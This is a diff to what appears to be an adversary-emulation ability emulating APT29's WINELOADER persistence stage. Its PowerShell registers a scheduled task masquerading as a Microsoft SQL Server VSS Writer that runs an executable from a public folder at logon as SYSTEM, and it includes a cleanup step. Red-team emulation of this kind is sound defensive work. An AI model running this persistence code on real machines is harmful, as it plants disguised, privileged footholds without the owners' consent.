@@ -13,14 +13,19 @@
           $taskDesc = "Microsoft SQL Server VSS Writer";
           $workDir = "C:\Users\Public\Music\Work";
           $exePath = "$workDir\sqlwriter.exe";
-
-          # The file should exist at this point since Stage 2 has completed
-          if (Test-Path $exePath) {
-              try {
+          try {
+              Write-Host "[*] Start Stage 3 execution (Persistence)";
+              
+              Write-Host "[*] Checking for executable at: $exePath";
+              if (Test-Path $exePath) {
+                  Write-Host "[+] Executable found. Proceeding with task registration.";
+                  
+                  Write-Host "[*] Configuring task action, trigger and principal...";
                   $action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $workDir;
                   $trigger = New-ScheduledTaskTrigger -AtLogOn;
                   $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
 
+                  Write-Host "[*] Registering scheduled task: $taskName";
                   Register-ScheduledTask `
                       -TaskName $taskName `
                       -Action $action `
@@ -29,15 +34,18 @@
                       -Description $taskDesc `
                       -Force | Out-Null;
                   
-                  Write-Output "task_created_ms_sql_writer";
-              } catch {
-                  Write-Error "Failed to register task: $($_.Exception.Message)";
-                  exit 1;
-              }
-          } else {
-              # If we reach this point, Stage 2 reported success
-              # but the executable is missing (unexpected race condition)
-              Write-Error "Race condition detected: File not found yet at $exePath";
+                  if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+                      Write-Host "[+] Task '$taskName' registered successfully.";
+                      Write-Output "task_created_ms_sql_writer";
+                  } else {
+                      throw "Task registration confirmed by command, but task not found in system.";
+                  };
+              } else {
+                  throw "Race condition detected: File not found at $exePath. Stage 2 might have failed.";
+              };
+          } catch {
+              Write-Host "[!] Error encountered during persistence setup:";
+              Write-Error "Error: $($_.Exception.Message)";
               exit 1;
           }
         parsers:
@@ -48,4 +56,8 @@
             - source: apt29.wineloader.status
               match: stage2_executed
         cleanup: |
-          Unregister-ScheduledTask -TaskName "MS SQL Writer" -Confirm:$false -ErrorAction SilentlyContinue
+          $taskName = "MS SQL Writer";
+          if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+              Unregister-ScheduledTask -TaskName $taskName -Confirm:$false;
+              Write-Host "[+] Cleaned up scheduled task: $taskName";
+          };
